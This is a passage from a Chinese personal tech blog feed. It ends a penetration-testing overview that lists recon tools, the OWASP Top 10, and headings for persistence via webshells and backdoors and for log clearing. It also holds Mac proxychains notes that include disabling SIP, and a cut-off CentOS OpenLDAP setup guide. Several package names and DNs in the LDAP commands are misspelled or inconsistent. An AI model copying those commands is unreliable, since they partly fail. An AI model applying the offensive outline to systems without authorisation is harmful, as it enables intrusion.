未授权（之前博客总结过常见的端口以及攻击面）端口对应webserver</p></blockquote></li><li>扫描服务器对应端口web网站目录结构（查看是否目录遍历，敏感信息泄露：.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露）<blockquote><p>暴力破解：御剑 DirBrute<br>爬虫：————————</p></blockquote></li><li>github等网站开源项目信息泄露</li><li>waf检测<blockquote><p>whatwaf(<a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">https://github.com/Ekultek/WhatWaf</a>)</p></blockquote></li><li>旁站 和 c端<blockquote><p> <a href="http://www.sameip.org/" target="_blank" rel="noopener">http://www.sameip.org/</a></p></blockquote></li><li>嗅探（嗅探未加密数据）<blockquote><p>wireshark抓包 +tcpdump -&gt;数据分析<br>手机数据接口(真机代理，模拟器)<br>浏览器抓包（firebug，zap代理，burpsiut）<br>通常这个阶段可以进行自动化、半自动化方式来获取<br>项目进行中》》》》》》》》》》》期待续</p></blockquote></li></ul><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>在信息收集阶段，所收集到的信息，进行总结。找出服务端和业务端可能出现的攻击面，进行探测和模糊测试。</p><h4 id="owasp-top-10-2017版"><a href="#owasp-top-10-2017版" class="headerlink" title="owasp top 10 (2017版)"></a>owasp top 10 (2017版)</h4><p><img src="http://picture.manhao6.cn/渗透测试（持续更新）/20190404113019819.png" alt></p><ul><li>1.injection</li><li>2.broken authentication</li><li>3.sensitive Data Exposure</li><li>4.XML extend Enities</li><li>5.Broken Access Control</li><li>6.security Misconfiguration</li><li>7.Cross-Site script</li><li>8.Insecure Deserialization</li><li>9.Using Components with Known Vulerabilities</li><li>10.Insufficient Logging &amp; Monitoring<h4 id="重点漏洞"><a href="#重点漏洞" class="headerlink" title="重点漏洞"></a>重点漏洞</h4></li><li>XSS</li><li>XSRF</li><li>sql注入</li><li>代码执行</li><li>命令执行</li><li>越权访问</li><li>目录读取</li><li>任意文件读取与下载</li><li>文件包含</li><li>远程命令执行</li><li>弱口令</li><li>上传</li><li>暴力破解</li></ul><h2 id="漏洞利用与权限提升"><a href="#漏洞利用与权限提升" class="headerlink" title="漏洞利用与权限提升"></a>漏洞利用与权限提升</h2><p>漏洞利用</p><ul><li>OWASP Top 10</li><li>web安全漏洞</li><li>中间件漏洞</li><li>系统漏洞</li></ul><p>权限提升</p><ul><li>Windows/Linux</li><li>第三方</li><li>数据库</li></ul><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>由于自己还未接触到这阶段，到网上查了资料做了一个简要总结<br>内网渗透</p><ul><li>内网反弹（端口转发、端口复用）</li><li>域渗透</li></ul><p>权限维持</p><ul><li>系统后门（Window/Linux）</li><li>web后门（webshell、一句话木马）</li></ul><p>痕迹清除</p><ul><li>系统日志</li><li>web日志(IIS、Apache)</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;从去年4月份开始接触渗透，做了几个月后。因为考研，把所有的事都放下了。但是还没没考上，提遗憾的。技术没学到，研也没考上。但是还是有收获的，就是能沉淀下来学技术，静下心来看书。现在考研结束了，又要开始接触渗透了，找工作。&lt;/p&gt;
&lt;h1 id=&quot;0x02-渗透&quot;&gt;&lt;a href=&quot;#0x02-渗透&quot; class=&quot;headerlink&quot; title=&quot;0x02 渗透&quot;&gt;&lt;/a&gt;0x02 渗透&lt;/h1&gt;&lt;h2 id=&quot;渗透含义&quot;&gt;&lt;a href=&quot;#渗透含义&quot; class=&quot;headerlink&quot; title=&quot;渗透含义&quot;&gt;&lt;/a&gt;渗透含义&lt;/h2&gt;&lt;p&gt;渗透测试：通过模拟攻击者以及防御者的角度，在企业外部去分析目标所存在的安全隐患以及脆弱性，尽可能发现和找出企业存在的攻击面。&lt;/p&gt;
&lt;p&gt;黑客入侵：通过各种方法，甚至破坏的行为来侵入系统&lt;/p&gt;
&lt;p&gt;区别：渗透测试时找出所以攻击面，黑客入侵只要找出单个漏洞而进而利用侵入服务器。&lt;br&gt;
    
    </summary>
    
      <category term="0x01 技术原理" scheme="blog.manhao6.cn/categories/0x01-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/"/>
    
      <category term="渗透测试" scheme="blog.manhao6.cn/categories/0x01-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="blog.manhao6.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>mac笔记</title>
    <link href="blog.manhao6.cn/2019/03/04/mac%E7%AC%94%E8%AE%B0/"/>
    <id>blog.manhao6.cn/2019/03/04/mac笔记/</id>
    <published>2019-03-04T09:37:36.000Z</published>
    <updated>2019-04-15T09:06:12.173Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-terminal代理翻墙"><a href="#1-terminal代理翻墙" class="headerlink" title="1.terminal代理翻墙"></a>1.terminal代理翻墙</h2><p>Proxychains4</p><ul><li>安装Proxychains<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>proxychains-ng</span><br></pre></td></tr></table></figure></li></ul><a id="more"></a><p>配置config：</p><ul><li><p>Mac下用Homebrew安装的默认为/usr/local/etc/proxychains.conf</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ vim proxychains.conf</span><br><span class="line"></span><br><span class="line">quiet_mode</span><br><span class="line">dynamic_chain</span><br><span class="line">chain_len = <span class="number">1</span> #round_robin_chain和random_chain使用</span><br><span class="line">proxy_dns</span><br><span class="line">remote_dns_subnet <span class="number">224</span></span><br><span class="line">tcp_read_time_out <span class="number">15000</span></span><br><span class="line">tcp_connect_time_out <span class="number">8000</span></span><br><span class="line">localnet <span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">localnet <span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">localnet <span class="number">172.16</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.240</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">localnet <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">[ProxyList]</span><br><span class="line">socks5  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1086</span></span><br><span class="line">http    <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1087</span></span><br></pre></td></tr></table></figure></li><li><p>效果<br><img src="http://picture.manhao6.cn/mac%E7%AC%94%E8%AE%B0/20190304054148243.png" alt><br>tips：mac 10.13以上需关闭sip</p><blockquote></blockquote><p>重启Mac，按住Option键进入启动盘选择模式，再按⌘ + R进入Recovery模式。<br>实用工具（Utilities）-&gt; 终端（Terminal）。<br>输入命令csrutil disable运行。<br>重启进入系统后，终端里输入 csrutil status，结果中如果有 System Integrity Protection status:disabled. 则说明关闭成功</p></li></ul><h2 id="dsa"><a href="#dsa" class="headerlink" title="dsa"></a>dsa</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-terminal代理翻墙&quot;&gt;&lt;a href=&quot;#1-terminal代理翻墙&quot; class=&quot;headerlink&quot; title=&quot;1.terminal代理翻墙&quot;&gt;&lt;/a&gt;1.terminal代理翻墙&lt;/h2&gt;&lt;p&gt;Proxychains4&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装Proxychains&lt;figure class=&quot;highlight mipsasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;brew &lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;install &lt;/span&gt;proxychains-ng&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="0x05 生活杂项" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/"/>
    
      <category term="mac" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/mac/"/>
    
    
      <category term="mac优化" scheme="blog.manhao6.cn/tags/mac%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>centos-7 安装 openLDAP</title>
    <link href="blog.manhao6.cn/2019/03/01/centos-7-%E5%AE%89%E8%A3%85-openLDAP/"/>
    <id>blog.manhao6.cn/2019/03/01/centos-7-安装-openLDAP/</id>
    <published>2019-03-01T15:05:48.000Z</published>
    <updated>2019-04-15T09:01:19.498Z</updated>
    
    <content type="html"><![CDATA[<p>LDAP(Lightweight Directory Access Protocol，轻量级目录访问协议)是用来实现 目录服务 的一种运行于TCP/IP之上的协议。<br>LDAP是指“Lightweight Directory Access Protocol（轻量目录访问协议）”，它是基于X.500协议的，包括了X.500的大部分功能，但是精减掉了那些过于艰深的东西。<br>X.500</p><blockquote><p>X.500是OSI标准体系中的目录服务模型，它包含了命名空间的定义以及查询与更新目录的协议，但是X.500在很多场景下被认为有些“用力过猛”。而LDAP，虽然像X.500一样也为目录提供了数据/命名空间的模型与协议，但它被设计为运行在TCP/IP网络协议栈上.</p></blockquote><a id="more"></a><p>目录是一个特殊的数据库，它的数据经常被查询，但是不经常更新。不像普通的数据库，目录不包括对事件（transaction）的支持也不包括回滚特性。目录是很容易被复制的，以便增加它的可用性和可靠性。当目录被复制时，临时的数据不一致情况是允许出现的，只要最终这些数据得到同步即可。<br>一棵LDAP目录树<br><img src="http://picture.manhao6.cn/centos-7-安装-openLDAP/20190317050406384.png" alt><br>LDAP目录中的信息是按照树形结构组织的:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dc    domain component    域名部分   example.com  <span class="attribute">dc</span>=example,dc=com</span><br><span class="line">uid  <span class="built_in"> user </span>id             用户id 如mh</span><br><span class="line">ou    organization unit   组织单位 如tech</span><br><span class="line">cn    common name         公共名称 thomas johansson</span><br><span class="line">sn    surname             姓 </span><br><span class="line">dn    distinguished       唯一辨别名      <span class="attribute">uid</span>=test,ou=IT,dc=manhao6,dc=cn</span><br><span class="line">rdn   relative dn         相对辨别名</span><br><span class="line">c     country </span><br><span class="line">o      organization</span><br></pre></td></tr></table></figure></p><h2 id="安装OpenLDAP"><a href="#安装OpenLDAP" class="headerlink" title="安装OpenLDAP"></a>安装OpenLDAP</h2><p>ladp:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> openladp-<span class="keyword">server</span> openladp-<span class="keyword">client</span> -y</span><br></pre></td></tr></table></figure></p><p>安装目录<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/etc/</span>openladp</span><br></pre></td></tr></table></figure></p><p>启动sladpe<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">start</span> <span class="selector-tag">slapd</span><span class="selector-class">.service</span></span><br><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">enable</span> <span class="selector-tag">slapd</span><span class="selector-class">.service</span></span><br></pre></td></tr></table></figure></p><p>验证LDAP服务是否启动<br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@centos1 ~]<span class="comment"># netstat -antup | grep -i 389</span></span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>0.0.0.0:389             0.0.0.0:*               LISTEN      6969/slapd</span><br><span class="line">tcp6      <span class="number"> 0 </span>    <span class="number"> 0 </span>:::389                  :::*                    LISTEN      6969/slapd</span><br></pre></td></tr></table></figure></p><p>上述都通过，则安装过程就完工了。</p><h2 id="OpenLDAP-database"><a href="#OpenLDAP-database" class="headerlink" title="OpenLDAP database"></a>OpenLDAP database</h2><p>设置数据库和修改‘/var/lib/ldap’权限<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/openldap-servers/DB_CONFIG.example /var/<span class="class"><span class="keyword">lib</span>/<span class="title">ldap</span>/<span class="title">DB_CONFIG</span></span></span><br><span class="line">chown <span class="symbol">ldap:</span>ldap /var/<span class="class"><span class="keyword">lib</span>/<span class="title">ldap</span>/*</span></span><br></pre></td></tr></table></figure></p><p>添加LDAP schemas:<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># ldapadd -Y EXTERNAL -H ldapi:<span class="comment">/// -f /etc/openldap/schema/cosine.ldif</span></span></span><br><span class="line"><span class="meta"># ldapadd -Y EXTERNAL -H ldapi:<span class="comment">/// -f /etc/openldap/schema/nis.ldif</span></span></span><br><span class="line"><span class="meta"># ldapadd -Y EXTERNAL -H ldapi:<span class="comment">/// -f /etc/openldap/schema/inetorgperson.ldif</span></span></span><br></pre></td></tr></table></figure></p><h2 id="Configure-OpenLDAP"><a href="#Configure-OpenLDAP" class="headerlink" title="Configure OpenLDAP"></a>Configure OpenLDAP</h2><p>OpenLDAP服务的配置文件放在/etc/openldap/slapd.d/目录下。我们首先需要更新olcSuffix和olcRootDN变量。</p><ul><li>olcSuffix - 数据库后缀，它是LDAP服务器提供信息的域名。简单来说，它应该更改为您的域名。</li><li>olcRootDN - 具有对LDAP执行所有管理活动的无限制访问权限的用户的根专有名称（DN）条目，如root用户。</li><li>olcRootPW - 上述RootDN的LDAP管理员密码。</li></ul><p>以上条目需要在/etc/openldap/slapd.d/cn=config/olcDatabase={2}hdb.ldif文件中更新。建议不要手动编辑LDAP配置，因为每次运行ldapmodify命令时都会丢失更改<br>slappasswd 命令来生成一个密码，并使用 LDIF（LDAP 数据交换格式）文件将其导入到 LDAP 中来配置管理员密码<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@centos<span class="number">-1</span> ~]<span class="meta"># slappasswd</span></span><br><span class="line">New password:</span><br><span class="line">Re-enter <span class="keyword">new</span> password:</span><br><span class="line">&#123;SSHA&#125;bQks6gdTmJ5Z8L/svnyu2HcmYCyidD8t</span><br><span class="line"></span><br><span class="line">[root@centos<span class="number">-1</span> ~]<span class="meta">#vim chrootpw.ldif</span></span><br><span class="line"><span class="meta"># specify the password generated above for <span class="meta-string">"olcRootPW"</span> section</span></span><br><span class="line">dn: olcDatabase=&#123;<span class="number">0</span>&#125;<span class="built_in">config</span>,cn=<span class="built_in">config</span></span><br><span class="line">changetype: modify</span><br><span class="line">add: olcRootPW</span><br><span class="line">olcRootPW: &#123;SSHA&#125;KS/bFZ8KTmO56khHjJvM97l7zivH1MwG</span><br><span class="line"></span><br><span class="line">$ ldapadd -Y <span class="literal">EXTERNAL</span> -H ldapi:<span class="comment">/// -f chrootpw.ldif</span></span><br></pre></td></tr></table></figure></p><p>配置 LDAP 的顶级域（以 dc=manhao6,dc=cn 为例）及其管理域<br><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[root@centos-1 ~]<span class="comment"># slappasswd</span></span><br><span class="line"><span class="attribute">New password:</span></span><br><span class="line"><span class="attribute">Re-enter new password:</span></span><br><span class="line"><span class="attribute">&#123;SSHA&#125;G8008LAOQZp5ub+S7RQ/y9yY6QFZEnP7</span></span><br><span class="line"><span class="attribute">[root@centos-linux openldap]# vim chdomain.ldif</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">dn</span>: olcDatabase=&#123;1&#125;monitor,cn=config</span><br><span class="line"><span class="attribute">changetype</span>: modify</span><br><span class="line"><span class="attribute">replace</span>: olcAccess</span><br><span class="line"><span class="attribute">olcAccess</span>: &#123;0&#125;to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth"</span><br><span class="line">  read by dn.base="cn=admin,dc=manhao6,dc=cn" read by * none</span><br><span class="line"></span><br><span class="line"><span class="attribute">dn</span>: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line"><span class="attribute">changetype</span>: modify</span><br><span class="line"><span class="attribute">replace</span>: olcSuffix</span><br><span class="line"><span class="attribute">olcSuffix</span>: dc=manhao6,dc=cn</span><br><span class="line"></span><br><span class="line"><span class="attribute">dn</span>: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line"><span class="attribute">changetype</span>: modify</span><br><span class="line"><span class="attribute">replace</span>: olcRootDN</span><br><span class="line"><span class="attribute">olcRootDN</span>: cn=admin,dc=manhao6,dc=cn</span><br><span class="line"></span><br><span class="line"><span class="attribute">dn</span>: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line"><span class="attribute">changetype</span>: modify</span><br><span class="line"><span class="attribute">add</span>: olcRootPW</span><br><span class="line"><span class="attribute">olcRootPW</span>: &#123;SSHA&#125;G8008LAOQZp5ub+S7RQ/y9yY6QFZEnP7</span><br><span class="line"><span class="attribute">dn</span>: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line"><span class="attribute">changetype</span>: modify</span><br><span class="line"><span class="attribute">add</span>: olcAccess</span><br><span class="line"><span class="attribute">olcAccess</span>: &#123;0&#125;to attrs=userPassword,shadowLastChange by</span><br><span class="line">  dn="cn=admin,dc=manhao,dc=cn" write by anonymous auth by self write by * none</span><br><span class="line"><span class="attribute">olcAccess</span>: &#123;1&#125;to dn.base="" by * read</span><br><span class="line"><span class="attribute">olcAccess</span>: &#123;2&#125;to * by dn="cn=admin,dc=manhao6,dc=cn" write by * read</span><br><span class="line"></span><br><span class="line">[root@centos-linux openldap]<span class="comment"># ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif</span></span><br></pre></td></tr></table></figure></p><p>ps:找网上一些教程有报错：<br>modifying entry “olcDatabase={1}monitor,cn=config”<br>modifying entry “olcDatabase={2}bdb,cn=config”<br>ldap_modify: No such object (32)<br>    matched DN: cn=config</p><blockquote><p>解决办法：<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">olcDatabase=</span><span class="template-variable">&#123;2&#125;</span><span class="xml">bdb到olcDatabase=</span><span class="template-variable">&#123;2&#125;</span><span class="xml">hdb</span></span><br></pre></td></tr></table></figure></p></blockquote><p>来创建一个公司的组织，并在其下创建一个 Manager 的组织角色（该角色内的用户具有管理整个 LDAP 的权限）和 People 和 Group 两个组织单元<br><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@centos-linux openldap]<span class="comment"># vim basedomain.ldif</span></span><br><span class="line"><span class="comment"># replace to your own domain name for "dc=***,dc=***" section</span></span><br><span class="line"><span class="attribute">dn</span>: dc=manhao6,dc=cn</span><br><span class="line"><span class="attribute">objectClass</span>: top</span><br><span class="line"><span class="attribute">objectClass</span>: dcObject</span><br><span class="line"><span class="attribute">objectclass</span>: organization</span><br><span class="line"><span class="attribute">o</span>: manhao6.cn</span><br><span class="line"><span class="attribute">dc</span>: manhao6</span><br><span class="line"></span><br><span class="line"><span class="attribute">dn</span>: cn=admin,dc=manhao6,dc=cn</span><br><span class="line"><span class="attribute">objectClass</span>: organizationalRole</span><br><span class="line"><span class="attribute">cn</span>: Manager</span><br><span class="line"></span><br><span class="line"><span class="attribute">dn</span>: ou=people,dc=manhao6,dc=cn</span><br><span class="line"><span class="attribute">objectClass</span>: organizationalUnit</span><br><span class="line"><span class="attribute">ou</span>: people</span><br><span class="line"></span><br><span class="line"><span class="attribute">dn</span>: ou=group,dc=manhao6,dc=cn</span><br><span class="line"><span class="attribute">objectClass</span>: organizationalUnit</span><br><span class="line"><span class="attribute">ou</span>: group</span><br><span class="line"></span><br><span class="line">[root@centos-linux openldap]<span class="comment"># ldapadd -x -D cn=admin,dc=manhao6,dc=cn -W -f basedomain.ldif</span></span><br></pre></td></tr></table></figure></p><p>通过上述我们设置好了一个 LDAP 目录树：其中基准 dn：dc=manhao6,dc=cn 是该树的根节点，其下有一个管理域 cn=admin,dc=manhao6,dc=cn 和两个组织单元 ou=people,dc=manhao6,dc=cn 及 ou=group,dc=manhao6,dc=cn</p><h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ slappasswd</span><br><span class="line">New password:</span><br><span class="line">Re-enter new password:</span><br><span class="line">&#123;SSHA&#125;HTGqAd4p6fOOIVHm7VZYUSorWGfnrqAA</span><br><span class="line"></span><br><span class="line">$ vim ldapuser.ldif</span><br><span class="line"><span class="meta"># create new</span></span><br><span class="line"><span class="meta"># replace to your own domain name for <span class="string">"dc=***,dc=***"</span> section</span></span><br><span class="line"><span class="symbol">dn:</span> uid=manhao,ou=users,dc=manhao6,dc=cn</span><br><span class="line"><span class="symbol">objectClass:</span> top</span><br><span class="line"><span class="symbol">objectClass:</span> account</span><br><span class="line"><span class="symbol">objectClass:</span> posixAccount</span><br><span class="line"><span class="symbol">objectClass:</span> shadowAccount</span><br><span class="line"><span class="symbol">cn:</span> manhao</span><br><span class="line"><span class="symbol">uid:</span> manhao</span><br><span class="line"><span class="symbol">uidNumber:</span> <span class="number">9999</span></span><br><span class="line"><span class="symbol">gidNumber:</span> <span class="number">100</span></span><br><span class="line"><span class="symbol">homeDirectory:</span> <span class="meta-keyword">/home/</span>manhao</span><br><span class="line"><span class="symbol">loginShell:</span> <span class="meta-keyword">/bin/</span>bash</span><br><span class="line"><span class="symbol">gecos:</span> user</span><br><span class="line"><span class="symbol">userPassword:</span> &#123;crypt&#125;x</span><br><span class="line"><span class="symbol">shadowLastChange:</span> <span class="number">17058</span></span><br><span class="line"><span class="symbol">shadowMin:</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">shadowMax:</span> <span class="number">99999</span></span><br><span class="line"><span class="symbol">shadowWarning:</span> <span class="number">7</span></span><br><span class="line"></span><br><span class="line">[root@localhost schema]<span class="meta"># ldapadd -x -W -D <span class="string">"cn=admin,dc=manhao6,dc=cn"</span> -f newuser.ldif</span></span><br><span class="line">Enter LDAP Password:</span><br><span class="line">adding new entry <span class="string">"uid=manhao,ou=users,dc=manhao6,dc=cn"</span></span><br></pre></td></tr></table></figure><p>修改某用户密码：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldappasswd -s manhao -W -D <span class="string">"cn=admin,dc=manhao6,dc=cn"</span> -<span class="keyword">x</span> <span class="string">"uid=manhao,ou=users,dc=manhao6,dc=cn"</span></span><br></pre></td></tr></table></figure></p><p>查询某用户：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x <span class="attribute">cn</span>=manhao -b <span class="attribute">dc</span>=manhao6,dc=cn</span><br></pre></td></tr></table></figure></p><h2 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h2><p>删除用户：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapdelete -x -W -<span class="keyword">D</span> <span class="string">'cn=Manager,dc=manhao6,dc=com'</span> <span class="string">"uid=ldapuser1,ou=People,dc=ho1ho,dc=com"</span></span><br></pre></td></tr></table></figure></p><p>删除组：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapdelete -x -W -<span class="keyword">D</span> <span class="string">'cn=Manager,dc=manhao6,dc=com'</span> <span class="string">"cn=ldapuser1,ou=Group,dc=ho1ho,dc=com"</span></span><br></pre></td></tr></table></figure></p><h2 id="设置日志"><a href="#设置日志" class="headerlink" title="设置日志"></a>设置日志</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim loglevel.ldif</span><br><span class="line"><span class="symbol">dn:</span> cn=config</span><br><span class="line"><span class="symbol">changetype:</span> modify</span><br><span class="line"><span class="symbol">replace:</span> olcLogLevel</span><br><span class="line"><span class="symbol">olcLogLevel:</span> stats</span><br><span class="line"></span><br><span class="line">[root@localhost schema]<span class="meta"># ldapmodify -Y EXTERNAL -H ldapi:<span class="comment">/// -f loglevel.ldif</span></span></span><br><span class="line">SASL/EXTERNAL authentication started</span><br><span class="line">SASL username: gidNumber=<span class="number">0</span>+uidNumber=<span class="number">0</span>,cn=peercred,cn=external,cn=auth</span><br><span class="line">SASL SSF: <span class="number">0</span></span><br><span class="line">modifying entry <span class="string">"cn=config"</span></span><br></pre></td></tr></table></figure><p>在/etc/rsyslog.conf中添加如下内容，然后重启rsyslog服务。</p><blockquote><p>local4.*          /var/log/slapd.log</p></blockquote><p>重启</p><p>#service  rsyslog restart<br>日志在/var/log/slapd.log中</p><h2 id="设置证书"><a href="#设置证书" class="headerlink" title="设置证书"></a>设置证书</h2><p>修改用户：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R <span class="string">ldap:</span>ldap <span class="regexp">/etc/</span>openldap<span class="regexp">/certs/</span>ldap.*</span><br></pre></td></tr></table></figure></p><p>新建certs.ldif用来配置LDAP使用自签名证书来进行安全会话<br><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 